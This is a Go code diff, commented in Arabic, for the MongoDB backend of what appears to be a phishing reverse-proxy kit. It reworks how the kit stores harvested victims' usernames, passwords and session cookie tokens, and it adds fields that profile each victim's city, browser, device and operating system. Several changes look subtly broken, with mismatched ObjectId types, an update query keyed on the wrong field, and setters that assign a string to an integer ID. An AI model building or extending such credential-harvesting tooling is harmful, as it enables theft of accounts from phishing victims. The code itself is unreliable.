@@ -25,24 +25,28 @@ type MongoDatabase struct {
 
 // Session مع تعديلات لدعم MongoDB
 type MongoSession struct {
-	ID           primitive.ObjectID            `bson:"_id,omitempty" json:"_id,omitempty"`
-	Id           int                           `bson:"id" json:"id"`
-	Phishlet     string                        `bson:"phishlet" json:"phishlet"`
-	LandingURL   string                        `bson:"landing_url" json:"landing_url"`
-	Username     string                        `bson:"username" json:"username"`
-	Password     string                        `bson:"password" json:"password"`
-	Custom       map[string]string             `bson:"custom" json:"custom"`
-	BodyTokens   map[string]string             `bson:"body_tokens" json:"body_tokens"`
-	HttpTokens   map[string]string             `bson:"http_tokens" json:"http_tokens"`
-	CookieTokens map[string]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
-	SessionId    string                        `bson:"session_id" json:"session_id"`
-	UserAgent    string                        `bson:"useragent" json:"useragent"`
-	RemoteAddr   string                        `bson:"remote_addr" json:"remote_addr"`
-	CreateTime   int64                         `bson:"create_time" json:"create_time"`
-	UpdateTime   int64                         `bson:"update_time" json:"update_time"`
-	UserId       string                        `bson:"user_id" json:"user_id"`
-	CountryCode  string                        `bson:"country_code" json:"country_code"`
-	Country      string                        `bson:"country" json:"country"`
+	ID             bson.ObjectId          `bson:"_id,omitempty"`
+	SID            string                 `bson:"session_id" json:"session_id"`
+	Name           string                 `bson:"phishlet" json:"phishlet"`
+	Username       string                 `bson:"username" json:"username"`
+	Password       string                 `bson:"password" json:"password"`
+	Custom         map[string]string      `bson:"custom" json:"custom"`
+	Params         map[string]string      `bson:"params" json:"params"`
+	BodyTokens     map[string]string      `bson:"body_tokens" json:"body_tokens"`
+	HttpTokens     map[string]string      `bson:"http_tokens" json:"http_tokens"`
+	CookieTokens   []MongoCookieToken     `bson:"cookie_tokens" json:"cookie_tokens"`
+	Landing        string                 `bson:"landing_url,omitempty" json:"landing_url,omitempty"`
+	CreateTime     int64                  `bson:"create_time" json:"create_time"`
+	UpdateTime     int64                  `bson:"update_time" json:"update_time"`
+	UserAgent      string                 `bson:"useragent" json:"useragent"`
+	RemoteAddr     string                 `bson:"remote_addr" json:"remote_addr"`
+	// ضيف الحقول الجديدة
+	CountryCode    string                 `bson:"country_code" json:"country_code"`
+	Country        string                 `bson:"country" json:"country"`
+	City           string                 `bson:"city" json:"city"`
+	Browser        string                 `bson:"browser" json:"browser"`
+	DeviceType     string                 `bson:"device_type" json:"device_type"`
+	OS             string                 `bson:"os" json:"os"`
 }
 
 // NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
@@ -139,29 +143,45 @@ func convertToMongoSession(s *Session) *MongoSession {
 	}
 
 	mongoSession := &MongoSession{
-		Id:           s.Id,
-		Phishlet:     s.Phishlet,
-		LandingURL:   s.LandingURL,
+		ID:           primitive.NewObjectID(),
+		SID:          s.SessionId,
+		Name:         s.Phishlet,
 		Username:     s.Username,
 		Password:     s.Password,
 		Custom:       s.Custom,
+		Params:       s.Params,
 		BodyTokens:   s.BodyTokens,
 		HttpTokens:   s.HttpTokens,
-		CookieTokens: cookieTokens,
-		SessionId:    s.SessionId,
-		UserAgent:    s.UserAgent,
-		RemoteAddr:   s.RemoteAddr,
+		CookieTokens: []MongoCookieToken{},
+		Landing:      s.LandingURL,
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
-		UserId:       s.UserId,
+		UserAgent:    s.UserAgent,
+		RemoteAddr:   s.RemoteAddr,
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
+		City:         s.City,
+		Browser:      s.Browser,
+		DeviceType:   s.DeviceType,
+		OS:           s.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
 	log.Debug("[MongoDB] بعد التحويل:")
 	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
 	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
+
+	for domain, cookies := range s.CookieTokens {
+		for k, v := range cookies {
+			mct := MongoCookieToken{}
+			mct.Name = k
+			mct.Domain = domain
+			mct.Path = v.Path
+			mct.Value = v.Value
+			mct.JSON = v.JSON
+			mongoSession.CookieTokens = append(mongoSession.CookieTokens, mct)
+		}
+	}
 
 	return mongoSession
 }
@@ -190,23 +210,25 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	}
 
 	session := &Session{
-		Id:           ms.Id,
-		Phishlet:     ms.Phishlet,
-		LandingURL:   ms.LandingURL,
+		SessionId:    ms.SID,
+		Phishlet:     ms.Name,
+		LandingURL:   ms.Landing,
 		Username:     ms.Username,
 		Password:     ms.Password,
-		Custom:       ms.Custom,
+		Custom:         ms.Custom,
 		BodyTokens:   ms.BodyTokens,
 		HttpTokens:   ms.HttpTokens,
 		CookieTokens: cookieTokens,
-		SessionId:    ms.SessionId,
 		UserAgent:    ms.UserAgent,
 		RemoteAddr:   ms.RemoteAddr,
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
-		UserId:       ms.UserId,
 		CountryCode:  ms.CountryCode,
 		Country:      ms.Country,
+		City:         ms.City,
+		Browser:      ms.Browser,
+		DeviceType:   ms.DeviceType,
+		OS:           ms.OS,
 	}
 	
 	// طباعة البيانات بعد التحويل
@@ -266,8 +288,8 @@ func (m *MongoDatabase) GetLastSessionId() (int, error) {
 		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
 		return 0, err
 	}
-	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
-	return session.Id, nil
+	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.ID.Timestamp())
+	return int(session.ID.Timestamp()), nil
 }
 
 // CreateSession ينشئ جلسة جديدة في MongoDB
@@ -297,23 +319,27 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
 	newSession := &MongoSession{
-		Id:           newId,
-		Phishlet:     phishlet,
-		LandingURL:   landingURL,
+		ID:           primitive.NewObjectIDFromTimestamp(now),
+		SID:          sid,
+		Name:         phishlet,
 		Username:     "",
 		Password:     "",
 		Custom:       make(map[string]string),
+		Params:       make(map[string]string),
 		BodyTokens:   make(map[string]string),
 		HttpTokens:   make(map[string]string),
-		CookieTokens: make(map[string]map[string]interface{}),
-		SessionId:    sid,
-		UserAgent:    useragent,
-		RemoteAddr:   remoteAddr,
+		CookieTokens: []MongoCookieToken{},
+		Landing:      landingURL,
 		CreateTime:   now,
 		UpdateTime:   now,
-		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
+		UserAgent:    useragent,
+		RemoteAddr:   remoteAddr,
 		CountryCode:  "",
 		Country:      "",
+		City:         "",
+		Browser:      "",
+		DeviceType:   "",
+		OS:           "",
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
@@ -369,9 +395,6 @@ func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
 func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
 	
-	// تحقق من البيانات المخزنة فعلياً في MongoDB
-	m.ShowSessionDataInMongoDB(sid)
-	
 	var mongoSession MongoSession
 	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
 	if err != nil {
@@ -383,46 +406,13 @@ func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
 		return nil, err
 	}
 	
-	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
+	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.ID.Timestamp())
 	
 	// عرض وطباعة المعلومات المهمة
 	log.Success("[MongoDB] معلومات البلد المستردة من MongoDB: رمز البلد: '%s'، البلد: '%s'", 
 		mongoSession.CountryCode, mongoSession.Country)
 	
 	return convertFromMongoSession(&mongoSession), nil
-}
-
-// ShowSessionDataInMongoDB يُظهر البيانات الخام للجلسة من قاعدة البيانات
-func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
-	log.Debug("[MongoDB] استعراض البيانات الخام للجلسة: %s", sid)
-	
-	var rawDocument bson.M
-	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
-	if err != nil {
-		log.Error("[MongoDB] فشل استرداد البيانات الخام: %v", err)
-		return
-	}
-	
-	// طباعة الحقول المهمة
-	log.Debug("[MongoDB] البيانات الخام من MongoDB:")
-	log.Debug("[MongoDB] - _id: %v", rawDocument["_id"])
-	log.Debug("[MongoDB] - session_id: %v", rawDocument["session_id"])
-	log.Debug("[MongoDB] - id: %v", rawDocument["id"])
-	log.Debug("[MongoDB] - country_code: '%v' (نوع: %T)", rawDocument["country_code"], rawDocument["country_code"])
-	log.Debug("[MongoDB] - country: '%v' (نوع: %T)", rawDocument["country"], rawDocument["country"])
-	
-	// البيانات الاختبارية
-	log.Debug("[MongoDB] - test_country: '%v'", rawDocument["test_country"])
-	log.Debug("[MongoDB] - test_code: '%v'", rawDocument["test_code"])
-	log.Debug("[MongoDB] - direct_update: '%v'", rawDocument["direct_update"])
-	log.Debug("[MongoDB] - country_code_raw: '%v'", rawDocument["country_code_raw"])
-	log.Debug("[MongoDB] - country_raw: '%v'", rawDocument["country_raw"])
-	
-	// البيانات من الحقول المخصصة
-	if customData, ok := rawDocument["custom"].(map[string]interface{}); ok {
-		log.Debug("[MongoDB] - custom.country_code_custom: '%v'", customData["country_code_custom"])
-		log.Debug("[MongoDB] - custom.country_custom: '%v'", customData["country_custom"])
-	}
 }
 
 // UpdateSession يحدث جلسة في MongoDB
@@ -432,7 +422,7 @@ func (m *MongoDatabase) UpdateSession(s *Session) error {
 
 	_, err := m.sessionsColl.UpdateOne(
 		m.ctx,
-		bson.M{"id": s.Id},
+		bson.M{"id": s.SessionId},
 		bson.M{"$set": mongoSession},
 	)
 	return err
@@ -781,10 +771,6 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 			// استخدام الحقول المخصصة أيضاً للتأكد
 			"custom.country_code_backup": countryCode,
 			"custom.country_backup": country,
-			// حقول اختبار للتأكد من التحديث
-			"test_country": "TEST-" + country,
-			"test_code": "TEST-" + countryCode,
-			"update_method": "findOneAndUpdate",
 			"update_time": time.Now().UTC().Unix(),
 		},
 	}
@@ -826,8 +812,21 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 		log.Debug("[MongoDB] قيمة country بعد التحديث: '%s'", c)
 	}
 	
-	// تحقق إضافي: استرداد الجلسة كاملة للتأكد من التحديث
-	m.ShowSessionDataInMongoDB(sid)
-	
 	return nil
+}
+
+func (d *Database) SetSessionCityInfo(sid string, city string) {
+	s := &core.Session{}
+	s.Id = sid
+	s.City = city
+	d.UpdateSession(s)
+}
+
+func (d *Database) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) {
+	s := &core.Session{}
+	s.Id = sid
+	s.Browser = browser
+	s.DeviceType = deviceType
+	s.OS = os
+	d.UpdateSession(s)
 } 
